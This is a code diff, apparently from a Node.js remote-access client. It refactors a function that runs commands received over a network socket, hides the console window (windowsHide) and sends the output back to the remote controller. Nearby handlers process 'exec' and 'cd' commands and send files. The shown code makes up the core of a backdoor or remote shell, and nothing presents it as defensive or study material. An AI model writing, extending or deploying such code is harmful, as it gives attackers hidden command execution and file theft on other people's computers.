@@ -48,6 +48,16 @@ function sendFile(filePath) {
 	});
 }
 
+async function execute(command) {
+	await exec(
+		command,
+		{ cwd: path, windowsHide: true },
+		(e, stdout, stderr) => {
+			client.write(`${stdout}\n`);
+		}
+	);
+}
+
 client.on("data", (data) => {
 	const dataStr = data.toString();
 
@@ -57,16 +67,6 @@ client.on("data", (data) => {
 		third: dataStr.split(" ")[3],
 		fourth: dataStr.split(" ")[4],
 	};
-
-	async function execute(command) {
-		await exec(
-			command,
-			{ cwd: path, windowsHide: true },
-			(e, stdout, stderr) => {
-				client.write(`${stdout}\n`);
-			}
-		);
-	}
 
 	if (dataStr.startsWith("exec")) {
 		if (commandArgs.first === "cd") {
